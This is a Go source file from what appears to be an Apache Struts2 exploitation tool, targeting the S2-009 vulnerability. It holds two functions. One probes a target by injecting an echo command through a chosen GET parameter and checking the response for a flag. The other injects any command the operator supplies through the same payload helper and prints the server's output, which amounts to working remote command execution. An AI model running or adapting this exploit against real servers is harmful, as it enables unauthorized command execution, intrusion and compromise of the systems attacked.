package s009

import (
	"ST2G/cvemod/x51utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)
/*
s2-009检测方式：
	指定get参数名即可
 */

func Check(targeturl string,getparam string){
	targeturl = targeturl+x51utils.POC_s009_exec(getparam,"echo%20"+x51utils.Checkflag)
	req, err := http.NewRequest("GET", targeturl, nil)
	if err != nil {
		log.Fatal("Error reading request. ", err)
	}
	client := &http.Client{Timeout: time.Second * 10}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal("Error reading response. ", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal("Error reading body. ")
	}
	respBody := string(body)
	isVulnable := strings.Contains(respBody, x51utils.Checkflag)
	if isVulnable {
		x51utils.Colorlog("Found Struts2-009!")

	} else {
		fmt.Println("Struts2-009 Not Vulnerable.")
	}
}
func ExecCommand(getparam string,targeturl string,command string){
	targeturl = targeturl+x51utils.POC_s009_exec(getparam,command)
	req, err := http.NewRequest("GET", targeturl, nil)
	if err != nil {
		log.Fatal("Error reading request. ")
	}
	client := &http.Client{Timeout: time.Second * 10}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal("Error reading response. ")
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal("Error reading body. ")
	}
	respBody := string(body)
	fmt.Println(respBody)
}